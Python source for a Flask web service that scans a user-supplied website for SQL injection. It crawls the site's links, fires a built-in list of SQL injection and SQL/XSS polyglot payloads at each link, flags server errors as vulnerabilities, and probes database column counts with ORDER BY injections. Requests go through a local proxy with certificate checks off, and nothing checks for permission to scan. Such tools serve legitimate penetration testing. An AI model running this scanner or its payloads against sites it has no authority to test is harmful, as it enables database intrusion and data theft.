from flask import Flask, jsonify, request, render_template
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random, re
from urllib.parse import urlparse
from requests.exceptions import SSLError, ConnectionError
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import time, queue
import requests, re
from colorama import Fore, Style, init


app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
CORS(app)
event_queue = queue.Queue()

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
init(autoreset=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status', methods=['GET'])
def status():
    return "Backend is running"

@app.route('/events', methods=['GET'])
def sse():
    def event_stream():
        while True:
            message = event_queue.get()
            yield f'data: {message}\n\n'
    
    return Response(event_stream(), content_type='text/event-stream')

def get_response(url, retries=3):
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                return f"Secure: access to {url} was blocked with a 403 (Forbidden) code."
        except (requests.RequestException, SSLError, ConnectionError) as e:
            time.sleep(random.uniform(1, 3))
    return None

def is_ip_address(url):
    ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    return ip_pattern.match(url) is not None

def find_urls_to_test(url, base_url):
    if is_ip_address(url):
        url = f"http://{url}"
    
    if is_ip_address(base_url):
        base_url = f"http://{base_url}"
        
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')
    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)
    links = set()

    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        if href.startswith('/'):
            full_url = base_url + href
        elif href.startswith('http'):
            full_url = href
        else:
            full_url = f"{base_url}/{href}"
            
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
                links.add(full_url)
    
    if not links:
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                links.add(script.text)

    return links

def exploit_sqli(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        '" OR "1"="1"',
        '" OR "1"="1" --',
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1 OR 1=1",
        "admin' --",
        "administrator' --",
        "' UNION SELECT NULL, NULL --",
        "[Nothing]", 
        " ' or sleep(1) or '",
        ' " or sleep(1) or " ',
        " sleep(3)",
        """ sleep(3)/*' or sleep(3) or '" or sleep(3) or"*/""", 
        "/*‘ or ‘’=‘“ or “”=“*/",
        """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
        """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
        "'",
        '"',
        "`",
        "')",
        '")',
        '`)',
        "'))",
        '"))',
        "`))",
        "(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
    ]

    vulnerable_payloads = []
    for payload in payloads:
        target_url = url + payload
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if 500 <= r.status_code < 600:
                vulnerable_payloads.append((payload))
                print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
                
        except SSLError:
            return False
        except requests.RequestException:
            return False

    return vulnerable_payloads

def exploit_sqli_column_number(url):
    """
    Attempts to detect the number of columns in the database using SQL injection.

    Args:
        url (str): The target URL for testing column numbers in SQL injection.

    Returns:
        int or bool: The number of columns if detected, or False in case of an error.

    Description:
        - Iterates through a range of column numbers (1 to 4) and appends the SQL 'ORDER BY' clause to the target URL.
        - Sends an HTTP request to test the response for each column count.
        - If an "Internal Server Error" is encountered, the number of columns is considered to be one less than the current iteration.
        - Handles SSL and request-related exceptions.
        - Returns the number of columns or False if an error occurs or if no column number is determined.
    """
    for i in range(1, 10):
        target_url = url + "'+order+by+%s--" % i
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if "Internal Server Error" in r.text:
                return i - 1 
        except SSLError as e:
            print(f"[-] SSL Error en {target_url}: {e}")
            return False
        except requests.RequestException as e:
            print(f"[-] Request error en {target_url}: {e}")
            return False
    return False

@app.route('/scan', methods=['POST'])
def handle_scan():
    data = request.json
    if not data or 'target' not in data:
        return jsonify({"error": "No se proporcionó un objetivo válido"}), 400
    
    base_url = request.json.get('target').strip()
    base_url = base_url.rstrip('/')
    urls_to_test = find_urls_to_test(base_url, base_url)
    
    if urls_to_test:
        results = []
        for test_url in urls_to_test:
            sqli_result = exploit_sqli(test_url)
            num_col = exploit_sqli_column_number(test_url)
            if sqli_result:
                results.append({
                    "url": test_url,
                    "payloads": sqli_result
                })
                
            if num_col:
                print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                results.append({
                    "url": test_url,
                    "columns_detected": num_col
                })
            else:
                print("[-] URL not vulnerable to SQL injection")
            
        return jsonify({
            "sql_vulnerabilities_found": any('payloads' in result for result in results),
            "columns_detected_found": any('columns_detected' in result for result in results),
            "sql_injection_results": [r for r in results if 'payloads' in r],
            "column_detection_results": [r for r in results if 'columns_detected' in r]
        })
        
    else:
        return jsonify({"error": "No URLs with parameters found."})
    
if __name__ == "__main__":
    app.run(debug=True)
